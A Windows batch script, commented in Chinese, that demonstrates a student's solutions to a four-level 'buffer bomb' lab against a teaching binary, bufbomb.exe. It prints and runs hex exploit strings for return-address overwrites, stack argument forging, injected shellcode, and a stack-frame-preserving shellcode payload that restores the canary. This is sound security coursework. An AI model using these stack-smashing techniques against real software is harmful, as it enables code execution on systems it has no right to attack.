@echo off
chcp 936 >nul 2>&1
setlocal
set "EXE=bufbomb.exe"
set "STUDENT=720028"

cls
echo.
echo   +==============================================+
echo   实验3：超级缓冲区炸弹  --  攻击演示
echo   +==============================================+
echo.
echo   学号: %STUDENT%
echo.
echo   本次实验包含 4 个关卡，难度递增：
echo   第1关  覆盖返回地址，跳转到 Trojan1
echo   第2关  覆盖返回地址 + 构造栈参数，跳转到 Trojan2
echo   第3关  注入 shellcode，设置 global_value = cookie
echo   第4关  shellcode + 保持栈帧完好（最难）
echo.
echo   核心: getbuf() 分配 12 字节缓冲区，getxs() 不检查输入长度
echo.
echo   按 Enter 继续...
pause >nul

cls
echo   === 第1关：覆盖返回地址 ===
echo.
echo   目标: 让 getbuf() 返回时跳到 Trojan1()
echo.
echo   getbuf 栈帧布局:
echo   低地址(栈顶)
echo     buf[0..11]    == 你输入的前 12 字节
echo     保存的 EBP    == 第 13~16 字节
echo     返回地址       == 第 17~20 字节 (我们要改这里)
echo   高地址(栈底)
echo.
echo   攻击思路: 前 16 字节随便填，最后 4 字节覆盖为 Trojan1 地址
echo.
echo   攻击字符串:
echo   00 00 00 00 00 00 00 00 00 00 00 00  buf填充
echo   00 00 00 00                          覆盖EBP
echo   F0 11 40 00                          Trojan1地址(小端序)
echo.
echo   [按 Enter 发起攻击]
pause >nul

echo.
echo   --- 攻击输出 ---
> "%TEMP%\bufbomb_input.txt" echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 F0 11 40 00
"%EXE%" %STUDENT% < "%TEMP%\bufbomb_input.txt"
echo   ----------------
echo.
echo   按 Enter 继续...
pause >nul

cls
echo   === 第2关：传递通行密码 ===
echo.
echo   目标: 跳到 Trojan2(cookie)，参数必须是通行密码
echo.
echo   Trojan2 读参数: mov ebx, [esp+8]    ; 从栈上偏移+8读参数
echo.
echo   Trojan2 被调用后的栈:
echo   esp+0   旧 ebx       push ebx 保存的
echo   esp+4   返回地址
echo   esp+8   参数 val      == 我们要控制这里
echo.
echo   攻击思路: 返回地址之后多放 8 字节(假返回地址 + cookie)
echo.
echo   攻击字符串:
echo   00 00 00 00 00 00 00 00 00 00 00 00  buf填充
echo   00 00 00 00                          覆盖EBP
echo   10 12 40 00                          Trojan2地址
echo   00 00 00 00                          假返回地址(Trojan2会exit)
echo   A6 26 34 2F                          cookie(小端序)
echo.
echo   [按 Enter 发起攻击]
pause >nul

echo.
echo   --- 攻击输出 ---
> "%TEMP%\bufbomb_input.txt" echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 10 12 40 00 00 00 00 00 A6 26 34 2F
"%EXE%" %STUDENT% < "%TEMP%\bufbomb_input.txt"
echo   ----------------
echo.
echo   按 Enter 继续...
pause >nul

cls
echo   === 第3关：注入 Shellcode ===
echo.
echo   目标: 在栈上注入机器码，设置 global_value = cookie，再跳到 Trojan3
echo.
echo   Shellcode (16 字节):
echo   mov eax, [0x409000]     ; EAX = cookie            == A1 00 90 40 00
echo   mov [0x409004], eax     ; global_value = cookie   == A3 04 90 40 00
echo   push 0x00401260         ; Trojan3 地址压栈        == 68 60 12 40 00
echo   ret                     ; 跳到 Trojan3            == C3
echo.
echo   放置方式:
echo   buf有12字节, shellcode有16字节
echo   shellcode 占 buf(12) + 覆盖EBP(4) = 刚好16字节
echo   返回地址指向 buf 的栈地址，让 ret 跳回栈上执行 shellcode
echo.
echo   攻击字符串:
echo   A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3   shellcode
echo   24 FE 1A 00                                         返回地址=buf栈地址
echo.
echo   [按 Enter 发起攻击]
pause >nul

echo.
echo   --- 攻击输出 ---
> "%TEMP%\bufbomb_input.txt" echo A1 00 90 40 00 A3 04 90 40 00 68 60 12 40 00 C3 24 FE 1A 00
"%EXE%" %STUDENT% < "%TEMP%\bufbomb_input.txt"
echo   ----------------
echo.
echo   按 Enter 继续...
pause >nul

cls
echo   === 第4关：保持栈帧完好 ===
echo.
echo   目标: 同第3关注入 shellcode，但 Trojan4 不调用 exit()
echo   程序必须正常返回 -- 金丝雀不能死、EBP不能坏、返回值必须正确
echo.
echo   难点: test() 会检查
echo     1. bird == 0xDEADBEEF  (金丝雀存活)
echo     2. getbuf 返回值 == cookie
echo.
echo   解决方案: 逆序执行法
echo.
echo   执行流:
echo   getbuf == shellcode(设EAX) == test(检查通过) == Trojan4(通关) == main
echo.
echo   攻击字符串布局 (48 字节):
echo.
echo   偏移 0~11   shellcode (12字节, 刚好填满buf):
echo     A1 00 90 40 00    mov eax, [cookie]
echo     A3 04 90 40 00    mov [global_value], eax
echo     90                nop
echo     C3                ret
echo   偏移 12~15  48 FE 1A 00   恢复test的EBP
echo   偏移 16~19  24 FE 1A 00   返回地址=buf(执行shellcode)
echo   偏移 20~23  81 11 40 00   shellcode的ret跳回test
echo   偏移 24~31  00 ... 00      填充alloca区域
echo   偏移 32~35  EF BE AD DE   金丝雀 bird
echo   偏移 36~39  3C FF 1A 00   恢复main的EBP
echo   偏移 40~43  B0 12 40 00   test返回到Trojan4
echo   偏移 44~47  0D 14 40 00   Trojan4返回到main
echo.
echo   [按 Enter 发起攻击]
pause >nul

echo.
echo   --- 攻击输出 ---
> "%TEMP%\bufbomb_input.txt" echo A1 00 90 40 00 A3 04 90 40 00 90 C3 48 FE 1A 00 24 FE 1A 00 81 11 40 00 00 00 00 00 00 00 00 00 EF BE AD DE 3C FF 1A 00 B0 12 40 00 0D 14 40 00
"%EXE%" %STUDENT% < "%TEMP%\bufbomb_input.txt"
echo   ----------------

echo.
echo   --------------------------------------------------
echo.
echo   全部 4 关演示完毕!
echo.
echo   回顾:
echo   第1关 -- 覆盖返回地址 (最基础的栈溢出)
echo   第2关 -- 构造栈参数 (控制函数输入)
echo   第3关 -- 注入 shellcode (在栈上执行任意代码)
echo   第4关 -- 保持栈帧完整 (实战级 exploit)
echo.
echo   防御手段: 栈不可执行(NX), Stack Canary, ASLR, RELRO
echo.
del "%TEMP%\bufbomb_input.txt" 2>nul
pause

